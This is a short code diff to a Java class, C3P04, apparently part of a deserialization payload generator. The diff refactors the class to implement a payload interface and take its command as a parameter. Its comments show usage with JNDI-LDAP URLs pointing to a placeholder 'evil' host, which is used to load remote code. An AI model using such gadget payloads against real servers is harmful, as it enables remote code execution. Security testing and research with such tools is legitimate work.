@@ -43,9 +43,9 @@ import java.util.logging.Logger;
  * C3P04 'c3p0Jndi-ldap://x.x.x.x/evil'
  * C3P04 'jndi-ldap://x.x.x.x/evil'
  */
-public class C3P04 {
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String command = String.valueOf(type);
+public class C3P04 implements ObjectPayload<Object> {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
         int    sep     = command.lastIndexOf('-');
         if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <type>:<cmd>");
@@ -62,6 +62,11 @@ public class C3P04 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 
 
